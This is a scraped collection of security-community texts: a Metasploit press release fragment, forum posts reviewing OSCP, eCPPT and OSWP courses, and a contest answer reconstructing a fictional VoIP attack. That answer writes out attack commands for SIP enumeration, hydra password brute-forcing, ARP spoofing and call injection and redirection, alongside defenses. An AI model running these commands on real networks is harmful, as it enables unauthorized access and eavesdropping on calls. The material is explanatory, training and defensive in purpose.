project also filled a market gap with their collaboration to develop a stronger, more cost-effective penetration testing product for a larger audience. rapid7 first introduced metasploit express™ in april 2010, an affordable, easy-to-use penetration testing solution built on the metasploit framework that offers a full graphical user interface, automated exploitation capabilities and reporting for enterprises. this collaborative development of an open source-based commercial product was recognized as a success when metasploit express secured first place in the hackmiami 2010 penetration testing competition held this summer between metasploit express and two other proprietary solutions. in time for the one-year anniversary, rapid7 also released metasploit pro™ to bring unrestricted remote network access, web application scanning, social engineering campaigns and team capabilities, exceeding the functionality of metasploit express and further improving the efficiency of penetration testing.  with this functionality, integration with rapid7 nexpose® vulnerability management and backing by the markets most mature penetration testing solution, the metasploit framework, the commercial metasploit products have been adopted by more than 200 organizations since the first introduction five months ago. "when done right, the open source and commercial vendor collaboration model clearly works. by putting resources behind open source projects, forward-thinking commercial vendors help the community continue to innovate and invest in the projects success by assuring its quality and growth," said mike tuchen, president and ceo of rapid7. "this year, weve pioneered a special collaboration with one of the most popular open source security projects in the world and it has proven wildly successful, bringing unequalled value to the community and our own unique products. we look forward to continuing that collaboration and supporting the metasploit community." about rapid7 rapid7 is the leading provider of unified vulnerability management and penetration testing solutions, delivering actionable intelligence about an organization’s entire it environment.  rapid7 offers the only integrated threat management solution that enables organizations to implement and maintain best practices and optimize their network security, web application security and database security strategies. recognized as the fastest growing vulnerability management company in the u.s. by inc. magazine, rapid7 helps leading organizations such as liz claiborne, the united states postal service, carnegie mellon university and red bull to mitigate risk and maintain compliance for regulations such as pci, hipaa, fisma, sox and nerc.  rapid7 also manages the metasploit project, the leading open-source penetration testing platform with the world’s largest database of public, tested exploits.  to obtain a free download of nexpose or metasploit, please visit http: //www.rapid7.com/resources/free-downloads.jsp . for more information, visit  www.rapid7.com

3;The Value of an External Network Penetration Testhe value of an external network penetration test so, in my short lived career of a penetration tester, i have performed around 4 external security assessments.â  each assessment consisted of a scope of less than 20 public ip addresses, to which brute force and denial of services attacks were not permitted.â  on each occassion 1 or more of the following services are identified in during a full tcp and udp port scan. 21,22 23 25 53 80 443 1723 8080 taking away ports 80, 443 and 8080 where dependant on whether there is a website available publically and not secured so that only particular ip addresses can connect to it i often find that the assessment is not very fruitful.  so what testing do i perform? well on an ftp service i will check to see if anonymous access is permitted, weak credentials are in use (without running hydra to bruteforce as apparently this is not permitted??), grab banner and check for vulnerabilities in software, on most ocassions i pretty much can only report on the fact that ftp is clear text! am i missing something or is this how all external network penetration tests are

0;PWB v3 Reviewey guys, i shut-down my site where i initially had my pentesting with backtrack review on it. ive decided to make this thread my reviews new permanent home. i initially posted this review 6/21/2010: sorry i havent been active much on here for the passed couple of days. last thursday i opted for the offensive-security certified professional certification. for those of you who dont know, offensive-security is a company offering hands-on penetration testing courses utilizing the linux distrobution backtrack. a majority of these people are core developers of the backtrack live cd, which is a must for anyone interested in network security. they offer courses known as  wifu , which is dedicated towards wireless access point auditing using the aircrack-ng suite.  penetration with backtrack  (previously known as offensive-security 101) - which is dedicated toward network penetration testing, cracking the perimeter  (ctp) which is most likely one of the most advanced hardcore hacking classes out there, and their instructor led course  advanced windows exploitation  (awe), which is based around the courses name. i officially enrolled in penetration with backtrack v3 early february and signed up for the first day that the class begun (march 21st, 2010). i originally purchased 60 days lab access. prior to walking into the course, i had been using backtrack ever since its version 2 release back in 2007. the course requires a basic prerequisite of basic familiar skills & networking knowledge. my background walking in is i had a solid programming background as well as good metasploit, nmap, password-based attacks & information gathering skills. i had also played a little bit around with replicating buffer overflow exercises. i figured since ryan linn did a  solid review  of the penetration testing with backtrack v2 course, which basically reflected my opinions of the course, i would save myself some time and give out my commentary on the newly updated sections in the course; the linux buffer overflow module they added & the web application attack vectors they added. i also figured id add in my experience about the exam as well as some minor critiques of the course. first off, the whole course itself is amazing. i felt the labs definitely helped prep me for the exam, and while i didnt finish all of the extra mile optional exercises, these really did come in handy. the linux buffer overflow section walked through exploitation of a linux application and debugging it with the famous linux debugger gdb. my syntax with this tool was pretty rusty, but i found a useful demonstration of it on securitytube (which ill be posting after this short review). the linux buffer overflow section even includes a section on avoiding address space layout randomization (aslr) which i thought was pretty neat. the entire section on win32 exploitation was pretty solid, and the windows application we broke was straight forward enough that even beginners with little or no programming experience would be able to follow (with some minor reference links). the web application attack vector section was pretty strong. muts and the gang prepared a vulnerable web application for the course which was susceptible to sql injection, local and remote file inclusion and cross site scripting (xss). this is where i took advantage of the time to get to pick up on some of these skills. the vulnerable web app helped me out a lot because i hadnt played with way too much web application attack vectors in the past at all. i was also able to download the web application locally and use xampp lite to practice the attacks when i ran out of lab time. the videos walked through mssql and mysql injection, a brief demonstration and usage of sqlmap, browser redirection & cookie stealing, lfi and rfi. i was able to pick up on the sql injection stuff pretty effectively since i had sql experience from a class i had taken.this section was very solid. what really made the course enjoyable was the fact that theyve made the network simulate a real live attack environment. the offsec guys have written scripts that automate tasks that everyday users would do (like browse to pages, check e-mails, etc) and your able to pull off cleverly crafted client-side attacks. this was pretty neat considering you were able to build up your client-side attack skills in real life like scenarios. the lab itself is large with well over 40 machines spread out over 4 subnets for you to penetrate. machines on the lab were windows boxes (i remember seeing a windows 7 machine or two, a few vista boxes & server 2008 machines as well as your standard windows xp machines & 2003 servers, etc), as well as linux machines. i even came across a mac os machine in the lab, but wasnt able to break it. another thing that made things more simple is that once your signed up, your given a control panel, where your allowed to revert machines on the network within 30 seconds. doing this you were able to restore the lab machines back to their initial state then youd be able to attack them again. i found myself doing this a lot through out the course, especially on machines where services would freeze up and remote exploits wouldnt get through. a majority of the operators on their irc channel #offsec are pretty helpful, but there was a couple i stayed away from when i needed help. of course within the first week of the class, i got used to hearing the words, " try harder " so much that id wake up every night thinking the offensive-security team was in my house right beside me (just joking). one more new feature of penetration testing with backtrack was the overall final report. this had to be turned in with your notes for the course (which were taken with an application called leo or basket). i personally worked on the report for about 20-30 hours and it came out to an 85 page pdf file. the offsec guys give you a link to a sample demo report and i worked off of that. the report is pretty straight forward and formal. mine consisted of ports and services enumerated from the lab machines i had penetrated successfully along with the vulnerability exploited, a paragraph explaining the steps i used to gain entry to the machine, a recommended fix to attempt to patch the issue as well as a severity level, proof-of-concept link if a public exploit was used and a screen shot for proof i gained access to the machine. i also had an appendix section for files retrieved from the machines penetrated and more. toward the end of my 60 lab days i wanted my report to look pretty good, i also failed to use every single one of my days so i figured i would re-up on 15 extra lab days. i figured this would give me time to go back and penetrate the machines i had hit, take screen shots for the report and go after some of the ones i missed. my official exam date was scheduled almost a week after my 15 lab days expired. in between those days i worked on the report and practiced breaking the vulnerable web application that came with the course on one of my local virtual machines. finally wednesday hit, the day before the exam. the exam itself is 24 hours hands-on practical challenge and believe me some have taken that long. i was sure to stock up on enough caffeine (monster energy drinks) the day before the exam, just to make sure i would be able to stay up for the challenge. about 5 minutes from my scheduled challenge i received my oscp exam connection pack which allowed me to vpn into the exam network where all the machines i had to hit reside. at first it came to me as a relief. seeing all of the machines on the same network meant i wouldnt have to employ some tricky tunneling techniques to maneuver between subnets. without going into too much detail about the exam, x amount of machines exist on the network and each machine your tasked to break into it and obtain system / administrative / root privileges on. a couple of the tools in your attack arsenal are limited for the exam. it requires you to think outside of the box and plan out your attack surface more thoroughly before progressing onward. i started at 10am (pacific standard time) and only had rooted 1 machine by 4pm. by the time i crashed around 230am i had my official 70 points that i needed to pass the exam. i was pretty brain dead around then, had spent my day in my room listening to music, only getting up for a drinks and bathroom breaks. i remember being so focused and having to pee so bad that my bladder became an outcast. i kept thinking, "ill just try to get this machine real quick within 30 minutes, then get up and pee...", but thats what a course with offensive-security will do to you. friday morning around 8 o clock, i got up and wasnt 100% satisfied with having just the level of points to pass the exam, i had machines left on the network to root and that means i had to "try harder". i officially ended the exam having 1 machine i didnt obtain full permissions over but i did earn a low privilege shell on it. the exam overall was very challenging. having some basic python background, i was able to quickly craft 1 script that came in handy during the exam (and 2 or 3 that i used throughout the lab exercises). i enjoyed the course a lot, and liked the fact that the machines in the lab and exam were very challenging. i enjoyed the step machines on the lab networks an exam. the machines where it wasnt necessarily a remote root exploit that got you into the box, but an overall attack strategy you had to plan out on pen and paper or in your head to compromise the system. my overall oscp challenge took around 17-18 hours. the course was the best class ive been in so far. the course content videos were excellently put together and id highly recommend offensive-securitys training over a ton of other training vendors out there today. walking into penetration testing with backtrack, i may of well been on my way into the field of penetration testing, walking out of the course i feel like ive become a more ethical and respectful person with what one can do with their knowledge. ive learned countless attack vectors and strategies and have had to implement offensive security techniques in a practical lab environment. i not only leave as an offensive security certified professional, i also leave having acquired techniques thatll benefit my future in the network security world. my overall suggestion to those taking the course or planning on taking the course is to study, study, study! the topics presented in the course are great, but further reading on these topics do help too. having knowledge in a scripting language does definitely help. even a beginner programmer would have an easy time understanding the discussed python & bash code. be sure to screen shot every successful penetration and mine the compromised host for useful files, your bound to find something. if its possible, try to make some friends in their irc channel that could share hints and notes with when doing the lab exercises; this is what really helped me out. here are a few reference links i found useful during the course: http://carnal0wnage.blogspot.com/ http://www.exploit-db.com/ http://securityfocus.com http://ethicalhacker.net http://www.offensive-security.com/metasploit-unleashed/ http://milw0rm.com/  (which was up at the time) http://irongeek.com http://securitytube.net/ http://www.packetstormsecurity.org/ http://www.securityaegis.com/ http://synjunkie.blogspot.com/ http://www.corelan.be:8800/ the only negative if any, is i wish there wouldve been a little bit more metasploit coverage. more specifically on the meterpreter section regarding tunneling techniques, etc. i also wished ssh was mentioned and demonstrated use of similar to how plink.exe was. tunnelings pretty tricky and maybe the portfwd feature of the meterpreter and more of the ssh syntax wasnt covered simply because it wasnt needed on the exam. the web attack module was very good but i was surprised cross site request forgery wasnt demonstrated in the course videos. if anyone has questions or thinks i should include more info feel free to pm me. cheers -kri
3;eCPPT Certified!ey guys,  i woke up and checked my e-mail today and received an e-mail from elearnsecurity that i successfully obtained my ecppt certification. this is pretty exciting for me its my second certification this year, and theres still tons more to learn. my main thanks goes to don for selecting me as one of the 3 people for  may 2010s giveaway . it would be only fair for me to leave my personal review of the course.  before i start, id like to say my review in a way similarly reflects jason haddixs review  here . i would just like to leave my overall experience in the course and compare and contrast it with offensive-securitys pentesting with backtrack v3 course that i took earlier this year. upon getting my elearnsecurity course login credentials, i immediately scanned over the 3 available sections (system security, network security, and web application security) and immediately my attention was drawn towards the web application security module. this is the most hyped about section in the course and it did not fail to deliver. silly of me to login and skip past the first two sections - i had personally been exposed to the material and more in the pwb course.  you have up to 120 days from when you enroll into the course to opt for the ecppt certification, and you can start as early as 7 days being enrolled in it. im personally a full-time student, which made the allocated time excellent for me. my prime focus during the 120 days was to mainly focus on the web application security section. i spent most of my time going over the slides in this section a few times, some of the concepts introduced were new to me because pwb hadnt covered it in-depth like elearnsecurity did. the positives id like to emphasize in this section were that the attacks were well explained and it gave good examples on attack vectors, i was just a tad displeased that the excellent sql injection video demo was on a mssql/asp.net site and not a mysql/php site. i did appreciate this section showing us the attacks in different type of environments.  about 120 days in i scheduled my examination. after scheduling your exam, your given 30 days to do complete your pen-test and submit in a formal report regarding your findings. my issues regarding this process was the report. in pwb v3 i remember them issuing students report write-ups they could go off of when submitting reports but elearnsecuritys looked as if they were wanting a more in-depth and formal report. this report consisted of an executive report, vulnerability report, and a remediation report. in the course panel, they offer you various templates you could make use of to include into your report, which i found very useful. although they offered templates, a required report like this, which i hadnt done before scared me.  the examination itself consists of downloading a virtual machine with a custom-coded web-application on it. you (the person taking the exam), had to play the role of an attacker and find existing vulnerabilities within the given scope and report back your findings in a report. you werent personally limited to using a linux os for the examination, which i thought gave the exam some options. the actual pen-test itself is pretty fun and feels realistic. i actually enjoyed being handed a real-world hands-on examination versus a written multiple choice examination, it made me feel like i was working at something. i liked being able to break a web-app and walk out of the course having actual hands-on experience doing it.  i initially started the challenge 10/12 and eventually turned in my report 11/10. a few weeks later, i received an e-mail from els telling me i needed to include proof of sqli being present - which i hadnt found with my initial pen-test. between school and homework, being able to complete the pen-test and do a report was very do-able, i hadnt just looked hard enough for the sqli. i was given 7 days to find an available existence of this vulnerability in the custom web-app. immediately i fired-up my vm and looked harder and eventually found it, updated my report with my new findings and sent it in for review. personally, i regret not looking harder and having to be told to locate it and send the report back, it made me feel like i had failed in a way. overall, the course is definitely geared toward the beginner. i personally, didnt walk through any of the slides and attachments throughout the course in the system and network security sections, but i would highly recommend doing it. in order to get the most out of this course, id say go through it from start to end and focus especially on the web application security section.  i sort of feel stupid not looking into  mutillidae  or  damn vulnerable web app  prior to taking the examination. these alone would of made me feel perfectly prepared. i highly recommend people taking the course or plan on doing it, download these and pen-test them yourselves; doing so will make you feel especially ready for the exam. being able to find vulnerabilities in the web application is only half of the battle, youll also need to make a proficient report. this thread is very useful if your new to reporting  http://www.ethicalhacker.net/component/option,com_smf/itemid,54/topic,5456.msg28488/topicseen,1/ . i sort of based my report off of how i went about doing my pentesting with backtrack one but changed it around based off of what was required and split it up into the required sections.  what i liked about the penetration tester pro course was the examination proved your going to walk out of the course as a ecppt having hands-on web application penetration testing experience. it wasnt an extremely advanced, needed an 0-day exploit to pass exam, but it was at a level that anyone who studied the material would be able to pass.  ive heard some folks complain about the prime source of communication regarding this course, but i personally had no issues. i e-mailed armando on countless occasions and he responded back in a timely manner. i thought it was great they willingly put up a place for  feedback  that students can come in and offer what they think needs to be done to improve the course, and also vote on ideas proposed by other students.  the web application security section was put together well and it felt like it covered a broad range of attack vectors. i liked how they provided folks templates for the reports that we could use, this was excellent for people who are new to reporting.  some areas for improvement in my opinion would be the videos. i thought a majority of them were simplistic and saw a lot of point-and-click tools - i suppose coming from the offsec background, im used to seeing hacking illustrated utilizing a command-line environment. i wouldve liked to see more material in the network security section (mainly what haddix mentioned). i think it would be great for els to get a lab environment in (vpn), or hold capture the flag contests so students wouldnt have to practice the excercises locally. i think it is about being put into an environment and given a target that makes students feel their getting more pay off for the labs. the labs are okay but i think there should be a more hands-on approach for demonstrating students understand the concepts, like how the student would have to demonstrate they had to of grasped the web app section to do the final exam. i think it would be great if els would switch up the final examination and make the student feel like the systems security and network security sections were mandatory in the course. since the exam involved doing a web-application penetration test, my main interest was geared towards that particular module. i went throughout the course skipping some modules in previous sections.  i know elearnsecurity a couple days ago just recently updated to version 1.1 in which a social-engineering module was added to the network security section and they improved some more areas as well. i even saw armando asking students if he should make the content downloadable locally as oppose to just being available through the course website. i think these area both steps towards the right direction.  how does elearnsecuritys penetration testing pro stack up against offensive-securitys penetration testing with backtrack? being alumni in both now i could say both are good courses but they are completely different training options. offensive-securitys pwb course seems to be like, "you paid for the material, heres your downloadable videos, lab guide containing exercises, theres over 50 machines spread out across 4 subnets that are just waiting to be hacked - goodluck and try harder, hope you can endure pain during the exam!", while elearnsecuritys ptp seems to be like, "you paid for the material, heres access to the online-course containing interactive slides and video demonstrations on tool usage. you can follow the slides and download the attachments to complete labs and get the hands-on effect - be sure to get well acquainted with the web application security section, youll be attacking a custom web application during the examination." pwb is definitely for the more hardcore person who can endure pain, and just wants to get out there and go hack something. this course feels like nothing but a never ending capture the flag where your goal is to reach the network-secrets.txt file in order to unlock machines in your control panel. in pwb you pay for your allocated amount of lab time, as oppose with elss ptp - your given 120 days no matter what. elearnsecurity seems to be a flexible option in my opinion if your a busy person. in pwb i initially paid for 60 days lab time access and i regretted everyday i didnt utilize my lab time - i even had to go back and pay for extra days just to feel comfortable enough with the material. in elearnsecurity, it didnt come off at all that i was in a hurry to do the course.  content wise, i think pwb delivers very nicely in other areas that els ptp doesnt. this could be because pwb is geared directly towards network penetration testing and els ptp covered multiple domains of hacking. elearnsecurity did have a more in-depth web application attack section than pwb. walking into els ptp i scanned through the system and network security sections and went, "ive already been exposed to this stuff". though pwb did go over some xss, lfi/rfi and sql injection, it seemed elearnsecuritys web application security section went more in depth with it pentesting with backtrack i would recommend for the more hardcore person whos comfortable within linux, has been exposed to attack vectors and has hacked some stuff before but wants to get a more in-depth approach with tools and using backtrack for what its meant to be used for. elearnsecuritys ptp i would definitely recommend for someone new to the scene, looking to get exposed to a beginner level amount of material in system and network security, and more of an in-depth look at web app security. elearnsecurity i believe actually gives users 2 certification attempts.  i had a good time in the class and im happy to say im ecppt certified. i dont know if my review helped out much, sorry it was long and drawn out. if you guys have questions i could try to answer them -kri

1;Vulnerability Scanning vs Pen Testingi all, new to the boards, and fairly new into the field itself.  ive been involved in it for the last 10 years.  the first 8 were r & d activities at fortune 500 company, and the last two have been at the university where i graduated so very, very, very... long ago. were in the process of launching a vulnerability scanning program in our institution but are seeing a lot of resistance from various departments concerned with us taking down systems, or having access to things theyre not comfortable with.   using a commercial scanning product, what are peoples opinions about the value of scanning systems, and whether or not it help harden the defenses of an institution against actual pen testing.   im really interested in any studies or statistics that support/despise vulnerability scanning and how it fits in with an overall security strategy.   as for particular groups, has anyone had experience in selling this type of program to people that operate mostly appliance type systems (switches, hubs, printers, etc) rather than actual servers and workstations.  i think the approach may have to be a little different for those kinds of individuals.  it may be that they have a point about the roi, but im not sold on their stance quite yet. thanks in advance for any advice you can give. kevi

- mak kolybabi - andrew orr - russ tait milne of skullspace winnipeg ( http://skullspace.ca ) +----------------------------------------------------------------------------+ | 1) what was the purpose of jacks commands shown above?                    | +----------------------------------------------------------------------------+ * dhclient   jack used dhclient to obtain an ip address from the network. interestingly,   the dhcp offer and acknowledgements are seen at 1:44:50 utc, but the   request, which should have been broadcast at approximately the same time,   isnt present. one second after receiving the dhcp address, the router at   10.10.10.1 sends a single ping to jacks newly obtained address, which he   responds to. thats also unusual behaviour. * ifconfig   jack runs ifconfig for one of two reasons:   1) to determine the subnet mask for the network he connected to. since jack      knows that the main voip server is somewhere on the same subnet as he      plugged into, thanks to the contract he found, he might want to find the      subnet mask to determine exactly which hosts to scan. in this case, since      the subnet mask is 255.255.255.0, hell scan the full class c address      space.   2) jack may also run ifconfig to check what his mac address is      (00:50:56:10:10:55). if this is the case, then its the first evidence      we have that jack is planning on performing an arp poisoning attack. * msfconsole   run metasploit console. * use auxiliary/scanner/sip/options   use the auxiliary module called "scanner/sip/options", which will attempt   connections to all hosts on port 5060 with an options request. * set rhosts 10.10.10.1-254   jack wants to scan the subnet that hes connected to, since he knows thats   where the voip server is located. * run   run the sip scan. he discovers that one server, 10.10.10.77, is running   sip, and that its asterisk pbx 1.6.2.11. * use auxiliary/scanner/sip/enumerator   next, use the auxiliary module scanner/sip/enumerator, which scans a sip   server for numeric username/extensions using options/register commands. * set rhosts 10.10.10.77   jack now knows exactly which server hes attacking * set minext 1000 * set maxext 1100   jack is only interested in common extensions - 1000 to 1100. this may be a   guess on his part, or be based on a range implied by something written or   displayed on lucys phone. * run   perform the enumeration. based on the servers logs, this happens at   1:45:10 utc and takes less than a second. * exit   leave metasploit console. +----------------------------------------------------------------------------+ | 2) what was jacks big plan?                                               | +----------------------------------------------------------------------------+ from a high level, jack discovered that charlie brown and the gang were missing the point of christmas - senseless commercialism. so, being the good guy that he is, he decided to help them realize that they werent acting like good americans, and therefore were helping the terrorists. to do this, he needed to do two things: 1) to send a message to lucy, pretending to be their ruler, charlie brown,    telling her what christmas was really about. 2) ensure that charlie brown didnt show up and ruin the charade. to make this happen, jack had to take a number of actions: * find the sip server, which he uses metasploit for. * bruteforce an account on the sip server (he gained access to 1005 at   approximately 1:46:16 utc, according to the server logs). * use arp spoofing to monitor rtp traffic on the switched network until lucy   calls charlie brown (the arp spoofing starts at 1:46:35 utc, the call   happens at 1:47:19 utc). * after the call is established, monitor it until just the right time, then   inject a message to charlie brown telling him to stay home because nobody   likes him (the injection happened at 1:48:05 utc). its odd that he didnt   inject a message to lucy at the same time, but that may indicate a   limitation of the tool that jacks using. * wait until lucy tries to call charlie again, and redirect her to the   extension that jack has previously gained access to (she calls charlie back   at 1:49:08 utc). +----------------------------------------------------------------------------+ | 3) what tools and techniques could jack have used to implement the whole   | |    attack, particularly the ability to listen to conversations in real     | |    time, and to inject his message with precision? please be specific and  | |    chronological.                                                          | +----------------------------------------------------------------------------+ obviously, he used metasploit to find the voip server, and we already know the commands he used for that. the other tools he may have used are: * sip bruteforcing   it is difficult to determine which tool was used for sip bruteforcing,   since we have only logs and not packet captures from the asterisk server.   however, the most obvious tool for any bruteforcing is thc-hydra.   each account had 106 guesses performed against it. since thc-hydra can try   the blank password and the username as the password first, that means that   the dictionary contains either 104, 105, or 106 passwords. since no   dictionary ive ever seen is that small, and jack was likely in a hurry, it   is likely that he generated his own dictionary thats a subset of a larger   one.   there are two likely dictionaries that jack may have used to generate his   list:   * metasploits "data/wordlists/unix_passwords.txt" list, since we know     that metasploit was installed and handy.   * john the rippers password.lst, since most security folks have john     installed and its probably the best list.   the password for 1005 was guessed on the 20th try, according to the log. that   means that the 18th, 19th, or 20th password in the list was the key. that   gives us:   * metasploit: ashley, qwerty, 111111   * john: summer, internet, service   since 111111 makes sense for a password on a phone, my guess would be that   jack used hydra with the following command:   $ seq 1000 1005 > ./usernames.txt   $ head -n106 /pentest/exploit/framework3/data/wordlists/unix_passwords.txt \     > ./passwords.txt   $ hydra -l ./usernames.txt -p ./passwords.txt -f -v 10.10.10.77 sip   that series of commands would generate the exact traffic that we see -   guessing usernames between 1000 and 1005, performing 106 guesses per host,   and stopping after the first valid combination is found (1005:111111). * arp poisoning   at 1:46:35, an arp poisoning attack starts. every 2 seconds, an unsolicited   arp response is seen. this makes it possible to monitor and inject into   voip calls.   there are many tools that can be used for arp poisoning. the first one that   comes to mind is ettercap, but since that may be backdoored we assume that   jack is smart enough to avoid it. also, ettercaps traffic doesnt match   what is seen in the packet log.   the arp poisoning messages occur every 2 seconds until the end of the packet   capture. at 1:25:06 utc, jack sends an arp request for the routers address.   a tool that exhibits identical behaviour to this is arpspoof, from the   dsniff project. arpspoof would have been run as follows:   # arpspoof -t 10.10.10.77 10.10.10.1 * voip sniffing   at 1:47:19, lucy, at the theatre, calls charlie brown. because jack was   able to inject a message at the right moment (well, 10 seconds after the   right moment), we can deduce that he was either listening in real time,   or very nearly real time. we found several tools that could monitor and   replay voip calls after the fact, but very few that could play them in   real time.   ucsniff, a tool written by viper labs, can monitor sip/rtp traffic for voice   (and video!) in realtime. the commandline we used for this is the following:   # ucsniff -g   which opens up the gui version. after beginning monitoring, the calls   can be monitored in real time. * voip injection   at 1:48:05 utc, jack injects a message to charlie brown. we found a number   of tools that could inject pre-recorded messages, but only a couple that   actually worked. since jack doesnt mention any details of the conversation   in his message, its safe to assume that the message is pre-recorded.   the best (working) tool we found was rtp insertsound v3.0, from hacking voip   exposed (david endler & mark collier). it would be run with the following   commandline:   # rtpinsertsound -b 10.11.11.22 ./messagetocharlie.wav   this will wait for voip traffic going to 10.11.11.22, which we know is   charlies address. when it detects the traffic, it will ask jack to press   enter at the right moment. jack continues listening to the call and,   when the time is right (1:48:05 utc), he inserts the message. * voip redirection   at 1:49:08 utc, lucy at the theatre attempts to call charlie. jack responds   with 301 moved permanently, telling her to call 1005 instead (the number   jack had bruteforced earlier). we found a tool called redirectpoison,   from hacking voip exposed, that performs this attack. the command that jack   would have used is:   # redirectpoison <interface> 10.11.11.33 5060 <sip:1005@10.10.10.77>   which would redirect any calls originating from lucy at the theatre   (10.11.11.33) to the extension that jack had cracked, 1005. * voip calling   at 1:49:08 utc, lucy calls jack at 1005. since jack had previously   determined the password for that account, he doesnt need any special tools   to take calls. any voip client will do what he needs. +----------------------------------------------------------------------------+ | 4) how could linus have defended the infrastructure against jacks         | |    tactics?                                                                | +----------------------------------------------------------------------------+ * better passwords   it took jack 20 attempts to bruteforce the password for extension 1005. this   indicates that the password was far too simple. linus should have implemented   a password complexity policy, but the fact that it has to interface with the   phones might make that unreasonable, and other alternatives might be   investigated like two-factor authentication or vpns. * two-factor authentication   having a token with a changing password on it would have made this attack far   more difficult for jack. of course, with lucys track record, she probably   would have left her token on the desk, making the attack once again possible,   although more difficult, since he would only have been able to use lucys   account and not 1005.   additionally, using certificates for authenticating the phones would have   made jacks password-guessing attack almost impossible. * account lockout   if accounts were locked out after a certain number of login attempts, and   that number was less than 20, jack would not have been able to bruteforce the   login for extension 1005. * login delays   if there was a delay between login attempts, jacks attack would have taken   longer, giving linus more time to respond. * intrusion prevention   since linus has snort installed on the voip server, and the snort   installation detected a likely attack, having snort actively block the attack   would have prevented jack from performing an obvious password-guessing   attack. * isolated server   a large part of this attack was possible due to lucys phone being on the   same subnet as the asterisk server. even if all of the above changes were   made to the password authentication, jack still could have pulled off the   entire attack (although in a somewhat more complicated fashion). * protection from arp spoofing   since linus knew that putting lucys phone on the same network as the voip   server was a risk, he could have lowered the risk by ensuring that the router   had a static arp entry for the voip server. * 802.1x   requiring devices to authenticate to the switch before opening a port would   have prevented jack from accessing the network at all. this is assuming that   jack could not simply disconnect and reconnect lucys phone and record the   traffic. * secure sip and srtp   by using encryption on the sip/rtp traffic, jack wouldnt have been able to   listen in, inject messages, and redirect phonecalls. * using sip clients with reinvite   by using reinvite, the last sip call between lucy (at the theatre) and   charlie would have happened directly, without being routed through the main   sip server. that would prevent jack from hijacking it. +----------------------------------------------------------------------------+ | 5) how can linus set things right?                                         | +----------------------------------------------------------------------------+ im not 100% sure on what kind of answer is expected on this question, so im going to have some fun with creative writing. enjoy! thanks to linuss mistakes, and jacks ambitions, there are a number of problems in charlie browns world that have to be resolved. first, the children almost missed the school play in order to buy more presents and spread commercialism. although the story doesnt specifically say this happens, we know that the children will listen to their ruler, charlie brown, and do what he says. in normal cartoon fashion, linus would scramble down to the walmart, find the kids, and bring them back just in time for the play to start. the curtain would rise, and nobody would be on stage. the parents would be whispering to each other with their usual trombone voices. then, at the last minute, the first child would come on stage and christmas would be saved! second, the children need to get rid of jack skellington. the most obvious way to do that would be to call upon the great pumpkin, who is known to be the great protector of charlie browns world. linus, the one who knows the truth about the great pumpkin would have to summon him. im not sure what the ritual entails, but i suspect its blood sacrifice. there is definitely more to it than waiting in a field. anyway, the great pumpkin, knowing that the children are in danger, would show up and have a climactic fight with jack skellington. im picturing the battle at the end of the matrix, where the giant pumpkin jumps inside jack skellington and makes him explode. and finally, linus has to resolve the problems caused for charlie brown. charlie brown is known to have low self confidence coupled with high self hatred, and the combination of that and jack skellingtons insult may have been enough to push charlie brown over the edge. i imagine charlie brown climbing to the top of the highest building in the town and standing at the edge. linus would burst out the door and yell for him to stop! charlie, sobbing, would go over all the horrible things that have happened to him, and linus would be forced to try and talk him out of doing something horrible. finally, charlie would remember lucy and the football, close his eyes, and jump. but, like everything else, charlie would screw it up and end up landing on an awning which, according to the mythbusters and indiana jones, could potentially save somebody from falling to their death. so charlie brown would be saved, skellington would be defeated, and everybody would rejoice! congrats, do

3;Got my GCIH, now what?o im 6 months out of graduating school and just passed my gcih exam. now im wondering what certs should be on the top of my list for me if im trying to aspire to be a cyber security/info sec professional
0;OSWP Walkthroughk, since i got alot of positive feedback on my last "walkthrough" i made the descision to write another one for my oswp certification. again, if anyone got feedback/comments (donald or the guys at offensive security) please let me know! general info: after passing the oscp course i decided to take a well deserved break. after about a month something started itching  . i was so impressed by the learning method used by offensive security i just had to go for another one. giving the fact i went through hell (got there, got lost, wandered around for a long long time, and finally got back) to pass for pwb i decided to go for wifu. the main reason for this decision is that i feel i am not yet ready to pursue osce, cause of my previous experiences with pwb. another reason is that even though how much i ould like to learn it, writing exploits, learning assembly etc., it is a little bit out of scope for the work i do, but wifi becomes a more important factor for me. and last but not least, it is a bargain! when i clicked the sign up now button i noticed a different registration process. i received a mail with additional information about the course, and a registration form. from what i remember this is new. it is good to see that the guys at offsec are not only working on the course itself, but also everything else that counts to become a good, respectable learning institute. the outline is pretty much equal to the other courses. you will receive a lab guide (which is in size equal to the oscp one!) and ofcourse the videos, which will take about 2.5 hours to get through. they also specify the required skills needed to pass the course. this is a little bit more then the "basic linux commandline skills". i quote: "you need to have basic linux skills in order to complete this course- meaning you should be able to navigate through the linux filesystem, run simple commands, edit files and be comfortable in the command line in general." they also provide an estimated time for completing the course, which is according to offsec 2 hours. giving i have played with wifi and the air-suite before i guess it will be a little less, but we will see. the labs are hosted by the student. this means no vpn to connect to as with pwb, but set up your own wireless network. besides the fact that this is also good to know, it provides a nice look on the other side of it security, which is in this case not hacking it, but properly configuring it. they also provide some tips on hardware which should not be a problem, cause most of the wireless adapters have good support in the latest version of backtrack. finally there is an exam (ofcourse). this one will take about 3 hours including the time to prepare your results and to send them by mail. there are no pre set dates, but you have to schedule the exam within 4 months from your starting date. my guess is this will be no problem. right now i am waiting for further instructions, and i must say i am stoked to be starting another offsec course again!  (first) impressions: ok, this was supposed to be a first impression update, but since i already covered all material i will rename it to just impressions. as i suspected the course is significally smaller than oscp. i knew this before i started the course, because of the cpe points you get for both exams. ofcourse getting through the course so fast is partly my fault, because i spend almost the entire weekend on the course. first lets start with the course guide.  the first couple of chapters contain some background information on the wireless protocol. mostly is about the used protocols and operating modes. even though none of this information is required for the exam, it is very useful to read through to get a deeper understandig of the wireless protocol. there is also a chapter that covers the hardware aspect. while this information can be considered a little bit oudated because of the current developments within backtrack 4 and the upcoming 802.11n protocol it makes the choice of hardware a little bit easier if you dont want to go dig in technical specifications of wireless adapters. this is something i decided to do just because i think it is fun. like mosts hackers i like new toys and if possible, the best toys available. i got myself an alfa network awus036nh, which is not supported out of the box by bt4r2, but there are tutorials around to get it fully working. i bought this specific one with current and future developments in mind, because the n protocol becomes more and more mainstream. while i was at it, i also ordered a 9dbi high gain antenna to make the picture complete. ok, enough about the hardware. the course is mainly focussed on the aircrack suite. the last chapters cover some other tools briefly, but almost not noteworthy. i like the layout of the course, because the different attack techniques are explained before you start the actual attack. this gives a better understanding of what goes on while aircrack is doing what it does best. while doing some extended research on the tool (after getting some vague errors which somehow dissapeared after a reboot, so actually not noteworthy) i saw that most of the material is also covered on the aircrack site. this makes the course a little bit obsolete if you just want to learn wifu and do not want to pursue the certification. still the additional videos provide a good addition to the course 